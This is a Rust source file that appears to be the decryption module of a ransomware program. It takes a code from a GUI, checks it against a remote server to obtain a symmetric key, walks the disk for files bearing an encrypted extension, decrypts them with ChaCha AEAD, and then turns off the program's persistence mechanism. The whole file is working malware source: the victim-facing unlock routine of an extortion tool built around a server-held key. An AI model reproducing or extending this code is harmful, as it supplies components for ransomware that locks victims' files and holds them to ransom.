use std::{
    io,
    path::PathBuf,
    sync::{
        Arc,
        mpsc::{self, SyncSender},
    },
    thread::{self, JoinHandle},
};

use anyhow::Context;
use flume::{Receiver, bounded};
use purecrypto::zeroize::{Zeroize, Zeroizing};
use slint::{ComponentHandle, Weak};
use tracing::{debug, error, info};

use crate::{
    Main,
    client::{channel_capacity, recv_path},
    comm::{ServerConn, fetch_sym_key},
    config,
    crypto::{aead_decrypt_file, parse_encrypted_file_name},
    persist::stop_persist,
    status::Status,
    walker::walk_with_exts,
};

pub struct DecryptConfig {
    pub status: Status,
    pub conn: ServerConn,
    pub preshared_secret: &'static str,
    pub encrypted_extension: Arc<str>,
    pub walk_threads: usize,
    pub decrypt_threads: usize,
    pub persist: bool,
}

fn set_ui_status(ui: &Weak<Main>, text: &str, progress: Option<bool>) {
    let text = text.to_string();
    let result = ui.upgrade_in_event_loop(move |handle| {
        handle.set_status_text(text.into());
        if let Some(progress) = progress {
            handle.set_status_progress(progress);
        }
    });
    if let Err(error) = result {
        error!(error = ?error, "Failed to upgrade UI handle");
    }
}

pub fn spawn_decryption_handler(
    ui: &Main,
    config: DecryptConfig,
) -> io::Result<SyncSender<String>> {
    let ui_handle = ui.as_weak();
    let (decrypt_tx, decrypt_rx) = mpsc::sync_channel(1);

    thread_scope(config, ui_handle, decrypt_rx)?;

    Ok(decrypt_tx)
}

fn thread_scope(
    config: DecryptConfig,
    ui_handle: Weak<Main>,
    decrypt_rx: mpsc::Receiver<String>,
) -> io::Result<JoinHandle<()>> {
    thread::Builder::new().spawn(move || {
        let mut persistence_stopped = false;
        loop {
            let Ok(code): Result<String, _> = decrypt_rx.recv() else {
                debug!("Decryption channel closed; handler exiting");
                return;
            };

            let sym_key =
                match fetch_sym_key(&config.conn, &config.status, &code, config.preshared_secret) {
                    Ok(key) => key,
                    Err(error) => {
                        error!(error = ?error, "Symmetric key request failed");
                        set_ui_status(&ui_handle, "Code failed verification", Some(false));
                        continue;
                    }
                };

            info!("Starting decryption");
            set_ui_status(
                &ui_handle,
                "Code successfully verified. Decrypting...",
                None,
            );

            let aad: Arc<[u8]> = Arc::from(config.status.encryption_aad.as_bytes());
            match decrypt_files(
                sym_key,
                &config.encrypted_extension,
                config.walk_threads,
                config.decrypt_threads,
                &aad,
            ) {
                Ok(()) => {
                    info!("Decryption complete");
                    set_ui_status(&ui_handle, "Decryption complete", Some(false));
                }
                Err(error) => {
                    error!(error = ?error, "Failed to run decryption");
                    set_ui_status(&ui_handle, "Decryption failed", Some(false));
                }
            }

            if config.persist && !persistence_stopped {
                persistence_stopped = true;
                if let Err(error) = stop_persist() {
                    error!(error = ?error, "Failed to end persistence");
                }
            }
        }
    })
}

fn decrypt_files(
    sym_key: Zeroizing<[u8; 32]>,
    encrypted_extension: &Arc<str>,
    walk_threads: usize,
    decrypt_threads: usize,
    aad: &Arc<[u8]>,
) -> anyhow::Result<()> {
    let (dec_walk_tx, dec_walk_rx) = bounded(channel_capacity(decrypt_threads));
    let mut thread_handles = Vec::new();

    let exts = [encrypted_extension.to_string()];
    thread_handles.push(
        walk_with_exts(
            dec_walk_tx.clone(),
            Some(exts.as_slice()),
            None,
            walk_threads,
            Some(config::MAX_ENCRYPT_FILE_BYTES.saturating_add(16)),
        )
        .context("failed to spawn decryption walk coordinator")?,
    );
    drop(dec_walk_tx);

    let sym_key_arc = Arc::new(sym_key);
    for _ in 0..decrypt_threads {
        thread_handles.push(
            decrypt_worker(
                dec_walk_rx.clone(),
                Arc::clone(&sym_key_arc),
                Arc::clone(aad),
                Arc::clone(encrypted_extension),
            )
            .context("failed to spawn decryption worker")?,
        );
    }
    drop(dec_walk_rx);

    for handle in thread_handles {
        if handle.join().is_err() {
            error!("Decryption worker thread panicked");
        }
    }

    if let Ok(mut key) = Arc::try_unwrap(sym_key_arc) {
        key.zeroize();
    } else {
        error!("Failed to clear decryption key: outstanding references");
    }
    Ok(())
}

fn decrypt_worker(
    receiver: Receiver<Arc<PathBuf>>,
    key: Arc<Zeroizing<[u8; 32]>>,
    aad: Arc<[u8]>,
    expected_ext: Arc<str>,
) -> io::Result<JoinHandle<()>> {
    thread::Builder::new().spawn(move || {
        loop {
            let Some(file_path) = recv_path(&receiver) else {
                return;
            };

            info!(path = %file_path.display(), "Decrypting file");

            let Some(file_name_osstr) = file_path.file_name() else {
                error!(path = %file_path.display(), "File path has invalid file name");
                continue;
            };
            let Some(file_name) = file_name_osstr.to_str() else {
                error!(
                    file_name = %file_name_osstr.display(),
                    "File name is not valid UTF-8"
                );
                continue;
            };

            let Some((decrypted_file_name, full_nonce_bytes)) =
                parse_encrypted_file_name(file_name, &expected_ext)
            else {
                error!(file_name, "File name does not match encrypted shape");
                continue;
            };

            let Some(parent_dir) = file_path.parent() else {
                error!(path = %file_path.display(), "File path has invalid parent path");
                continue;
            };
            let decrypted_file_path = parent_dir.join(decrypted_file_name);

            match aead_decrypt_file(
                file_path.as_ref(),
                &decrypted_file_path,
                &key,
                &full_nonce_bytes,
                &aad,
                config::MAX_ENCRYPT_FILE_BYTES,
            ) {
                Ok(()) => {
                    debug!(
                        path = %file_path.display(),
                        "Successfully applied ChaCha to data for decryption"
                    );
                }
                Err(error) => {
                    error!(error = ?error, "Failed to apply ChaCha to data for decryption");
                }
            }
        }
    })
}
